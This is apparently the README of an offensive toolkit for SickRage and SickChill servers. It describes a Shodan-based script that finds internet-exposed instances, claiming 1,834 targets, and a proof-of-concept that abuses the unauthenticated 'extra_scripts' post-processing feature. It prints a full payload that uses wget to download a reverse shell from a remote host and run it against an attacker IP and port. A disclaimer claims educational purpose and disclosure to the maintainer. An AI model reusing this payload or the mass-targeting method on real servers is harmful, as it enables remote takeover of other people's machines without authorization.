# SickSploit

Collection of tools/scripts to exploit Sick* instances (SickRage, SickChill and similar forks.)

## Introduction 

SickRage/Chill/Beard are tools to automate the download of TV-Series using torrent or Usenet.
The programs offer similar functionalities and are all exploitable using the same technique.
In this repositories there are several tools, 'sickown' is a script which uses Shodan API to track down possible vulnerable instances of Sick* which are publicly exposed on the Internet.
Sickspolit is a POC tool that exploits a vulnerable instance.

## SickOwn 

Sickown uses a simple search query in Shodan to find open instances of Sick* and then attempts to also remove false positives from this list by querying the targets found.
At the time of the writing, 1834 targets are found.

Example usage of SickOwn is:

    $ python sickown.py -h
    usage: sickown.py [-h] API
    Use Shodan.io to track down vulnerable instances of SickChill/Rage
    positional arguments:
    API         The API_KEY for Shodan
    optional arguments:
    -h, --help  show this help message and exit

## SickSpolit

Sicksploit is a tool to provide a POC exploit for an open instance of Sickrage.
The exploit is easy and relies on a vulnerable feature. This vulnerabilities has been reported on 15th December to the maintainer of SickChill (the fork on which all the tests have been performed).
The exploit consisting in injecting a shell command in the 'extra_scripts' which are executed after post-processing downloaded files.
Post-processing usually consists of renaming and moving downloaded episodes of TV-Series, and Sick* offers the possibility to execute a custom script after each post-process.

The way I use to exploit this feature is by injecting a Payload such as:

    /usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O /tmp/shell|/usr/bin/python /tmp/shell 192.168.1.200 4444

This will clearly download a simple reverse shell which I have also included in the repo and then execute it with IP:port to connect to as parameters.


## Tested on

The exploit works on several versions of SickRage and SickChill where no authentication is configured. The same exploit technique would work on any SickBeard version as well.
However, I performed my tests on my own instance of SickChill Version: v2018.11.30-1 and SickRage Version: v2018.09.17-1. 


## Disclaimer

No public instances have been exploited in the process, nor I advise to do so. I have made this for pure educational purposes and I decline every responsibility for an eventual misuse of (part of) this code.

